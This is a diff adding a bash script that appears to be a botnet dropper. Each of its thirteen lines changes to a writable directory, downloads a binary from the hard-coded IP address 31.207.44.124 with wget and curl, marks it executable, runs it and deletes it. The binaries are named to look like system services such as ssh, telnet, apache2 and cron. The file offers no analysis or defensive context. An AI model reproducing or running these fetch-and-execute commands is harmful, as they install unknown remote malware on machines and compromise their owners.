@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/ntfdfpdpd; curl -O http://31.207.44.124/ntfdfpdpd; chmod +x ntfdfpdpd; ./ntfdfpdpd; rm -rf ntfdfpdpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/sasadd; curl -O http://31.207.44.124/sasadd; chmod +x sasadd; ./sasadd; rm -rf sasadd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/openssdashsh; curl -O http://31.207.44.124/openssdashsh; chmod +x openssdashsh; ./openssdashsh; rm -rf openssdashsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/bashaasd; curl -O http://31.207.44.124/bashaasd; chmod +x bashaasd; ./bashaasd; rm -rf bashaasd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/tftdsddp; curl -O http://31.207.44.124/tftdsddp; chmod +x tftdsddp; ./tftdsddp; rm -rf tftdsddp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/wgsdsdet; curl -O http://31.207.44.124/wgsdsdet; chmod +x wgsdsdet; ./wgsdsdet; rm -rf wgsdsdet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/crsdsdon; curl -O http://31.207.44.124/crsdsdon; chmod +x crsdsdon; ./crsdsdon; rm -rf crsdsdon
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/ftsdsdp; curl -O http://31.207.44.124/ftsdsdp; chmod +x ftsdsdp; ./ftsdsdp; rm -rf ftsdsdp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/pfsdsdtp; curl -O http://31.207.44.124/pfsdsdtp; chmod +x pfsdsdtp; ./pfsdsdtp; rm -rf pfsdsdtp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/ssdh; curl -O http://31.207.44.124/ssdh; chmod +x ssdh; ./ssdh; rm -rf ssdh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/nudsdt; curl -O http://31.207.44.124/nudsdt; chmod +x nudsdt; ./nudsdt; rm -rf nudsdt
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/apacsdsdhe2; curl -O http://31.207.44.124/apacsdsdhe2; chmod +x apacsdsdhe2; ./apacsdsdhe2; rm -rf apacsdsdhe2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.124/telnetsdd; curl -O http://31.207.44.124/telnetsdd; chmod +x telnetsdd; ./telnetsdd; rm -rf telnetsdd
